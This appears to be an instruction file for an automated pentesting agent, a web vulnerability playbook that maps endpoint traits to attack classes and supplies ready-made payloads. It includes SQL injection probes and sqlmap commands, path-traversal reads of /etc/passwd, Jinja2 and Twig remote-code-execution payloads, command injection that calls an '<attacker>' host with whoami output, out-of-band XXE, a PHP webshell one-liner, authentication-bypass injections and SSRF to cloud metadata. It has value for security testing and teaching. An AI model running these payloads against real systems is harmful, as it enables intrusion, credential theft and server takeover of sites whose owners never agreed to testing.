---
name: web-vuln
description: Web application vulnerability testing — detection patterns and techniques per vulnerability class
---

Systematic web vulnerability testing guide. For each endpoint discovered during RECON, identify which vulnerability classes apply based on the endpoint characteristics, then test accordingly.

## Detection Decision Tree

Match endpoint characteristics to vulnerability classes:

- Has query/POST parameters → SQLi, XSS, SSTI, Command Injection
- Accepts file path or filename → LFI/RFI, Path Traversal
- Accepts URL parameter → SSRF, Open Redirect
- Has file upload → File Upload bypass
- Has numeric ID (/user/1, ?id=1) → IDOR
- Has login/auth form → Auth Bypass, Credential Stuffing
- Accepts XML input → XXE
- Returns user input in response → XSS (Reflected)
- Has serialized data (cookies, hidden fields) → Deserialization
- Has template-rendered content → SSTI

## SQL Injection (SQLi)

Detection signals: Parameters used in database queries (id, user, search, sort, order)

1. Error-based detection:
   curl -ik "<url>?id=1'"
   curl -ik "<url>?id=1 AND 1=1--"
   curl -ik "<url>?id=1 AND 1=2--"
   # Compare response sizes — different sizes suggest injection

2. Union-based:
   curl -ik "<url>?id=1 UNION SELECT null--"
   curl -ik "<url>?id=1 UNION SELECT null,null--"
   # Increment nulls until column count matches

3. Time-based blind:
   curl -ik "<url>?id=1; WAITFOR DELAY '0:0:5'--"    # MSSQL
   curl -ik "<url>?id=1 AND SLEEP(5)--"                # MySQL
   curl -ik "<url>?id=1; SELECT pg_sleep(5)--"         # PostgreSQL

4. Automated with sqlmap:
   sqlmap -u "<url>?id=1" --batch --level=3 --risk=2
   sqlmap -u "<url>" --data="user=admin&pass=test" --batch   # POST

## Local File Inclusion (LFI) / Path Traversal

Detection signals: Parameters like file=, page=, path=, template=, include=, doc=

1. Basic traversal:
   curl -ik "<url>?file=../../../etc/passwd"
   curl -ik "<url>?file=....//....//....//etc/passwd"     # bypass filter
   curl -ik "<url>?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL encode

2. Null byte (old PHP):
   curl -ik "<url>?file=../../../etc/passwd%00"

3. PHP wrappers:
   curl -ik "<url>?file=php://filter/convert.base64-encode/resource=index.php"
   curl -ik "<url>?file=php://input" -d "<?php system('id'); ?>"

4. Windows paths:
   curl -ik "<url>?file=..\..\..\..\windows\system32\drivers\etc\hosts"
   curl -ik "<url>?file=C:\windows\win.ini"

## Server-Side Template Injection (SSTI)

Detection signals: Input reflected in rendered pages, template engines (Jinja2, Twig, Freemarker)

1. Detection probes (try in order):
   {{7*7}}          → 49 means Jinja2/Twig
   ${7*7}           → 49 means Freemarker/Velocity
   #{7*7}           → 49 means Ruby ERB/Java EL
   <%= 7*7 %>       → 49 means ERB
   {{7*'7'}}        → 7777777 means Jinja2

2. Jinja2 RCE:
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

3. Twig RCE:
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

## Command Injection

Detection signals: Parameters passed to system commands (ping, nslookup, filename processing)

1. Basic injection:
   curl -ik "<url>?ip=127.0.0.1;id"
   curl -ik "<url>?ip=127.0.0.1|id"
   curl -ik "<url>?ip=127.0.0.1$(id)"
   curl -ik "<url>?ip=127.0.0.1%0aid"         # newline

2. Blind (time-based):
   curl -ik "<url>?ip=127.0.0.1;sleep+5"
   curl -ik "<url>?ip=127.0.0.1|sleep+5"

3. Out-of-band:
   curl -ik "<url>?ip=127.0.0.1;curl+http://<attacker>/$(whoami)"

## Cross-Site Scripting (XSS)

Detection signals: User input reflected in HTML response

1. Reflected XSS:
   curl -ik "<url>?search=<script>alert(1)</script>"
   curl -ik "<url>?search=\"onmouseover=\"alert(1)\""
   curl -ik "<url>?search=<img src=x onerror=alert(1)>"

2. Check for encoding:
   curl -ik "<url>?q=<>\"'&"    # see which chars are escaped

Note: XSS is lower priority for pentesting (not direct server compromise) but useful for session hijacking chains.

## Server-Side Request Forgery (SSRF)

Detection signals: Parameters that accept URLs (url=, redirect=, fetch=, proxy=, callback=)

1. Internal service access:
   curl -ik "<url>?url=http://127.0.0.1/"
   curl -ik "<url>?url=http://127.0.0.1:8080/"
   curl -ik "<url>?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata

2. Port scanning via SSRF:
   curl -ik "<url>?url=http://127.0.0.1:22/"     # SSH banner
   curl -ik "<url>?url=http://127.0.0.1:3306/"    # MySQL

3. Bypass filters:
   curl -ik "<url>?url=http://0x7f000001/"         # hex IP
   curl -ik "<url>?url=http://2130706433/"          # decimal IP
   curl -ik "<url>?url=http://[::1]/"               # IPv6

## Insecure Direct Object Reference (IDOR)

Detection signals: Numeric or predictable IDs in URLs (/user/1, ?id=123, /order/456)

1. Enumerate IDs:
   curl -ik "<url>/user/1"
   curl -ik "<url>/user/2"
   curl -ik "<url>/user/0"
   curl -ik "<url>/user/-1"

2. Test with different auth:
   curl -ik -b "session=user_a" "<url>/user/2"   # access user B's data as user A

3. UUID/hash guessing:
   # If IDs are sequential, enumerate range
   for i in $(seq 1 100); do curl -so /dev/null -w "%{http_code} $i\n" "<url>/api/user/$i"; done

## XML External Entity (XXE)

Detection signals: Endpoints accepting XML (Content-Type: application/xml, SOAP, file upload with XML)

1. Basic XXE:
   curl -ik -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "<url>"

2. Blind XXE (out-of-band):
   curl -ik -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<attacker>/xxe">]><foo>&xxe;</foo>' "<url>"

## File Upload Bypass

Detection signals: File upload forms, avatar upload, document upload

1. Extension bypass:
   # Try: .php, .php5, .phtml, .pht, .php.jpg, .php%00.jpg
   curl -ik -F "file=@shell.php;filename=shell.php.jpg" "<url>/upload"
   curl -ik -F "file=@shell.php;filename=shell.phtml" "<url>/upload"

2. Content-Type bypass:
   curl -ik -F "file=@shell.php;type=image/jpeg" "<url>/upload"

3. Magic bytes:
   # Prepend GIF header to PHP shell
   echo -e "GIF89a\n<?php system(\$_GET['cmd']); ?>" > shell.php.gif

## Authentication Bypass

Detection signals: Login forms, admin panels, JWT tokens

1. Default credentials:
   admin:admin, admin:password, root:root, test:test

2. SQL injection in login:
   curl -ik -X POST -d "user=admin'--&pass=x" "<url>/login"
   curl -ik -X POST -d "user=admin' OR '1'='1'--&pass=x" "<url>/login"

3. JWT manipulation (if JWT used):
   # Decode JWT, change alg to "none", modify claims
   # Or try known weak secrets: "secret", "password", key files

4. Mass assignment:
   curl -ik -X POST -d "username=test&password=test&role=admin" "<url>/register"

## Open Redirect

Detection signals: Parameters like redirect=, url=, next=, return=, goto=

1. Test:
   curl -ikL "<url>/login?redirect=http://evil.com"
   curl -ikL "<url>/login?redirect=//evil.com"
   curl -ikL "<url>/login?redirect=/\evil.com"

## Deserialization

Detection signals: Base64-encoded cookies, Java/.NET serialized objects, PHP serialized data

1. PHP: Look for serialized data like O:4:"User":2:{...} in cookies or params
2. Java: Look for rO0AB (base64 Java serialized) in cookies
3. Python: Look for pickled data

Use ysoserial (Java), phpggc (PHP) to generate payloads.

## Testing Priority for Pentesting

Focus on vulnerabilities that lead to server compromise:
1. SQLi → database access, credential theft
2. Command Injection → direct RCE
3. SSTI → RCE
4. LFI → source code/credential leak → further exploitation
5. File Upload → webshell → RCE
6. SSRF → internal service access → pivot
7. XXE → file read → credential theft
8. Auth Bypass → privileged access
9. IDOR → data access, privilege escalation
10. Deserialization → RCE
11. XSS → session hijacking (indirect)
12. Open Redirect → phishing (lowest priority)
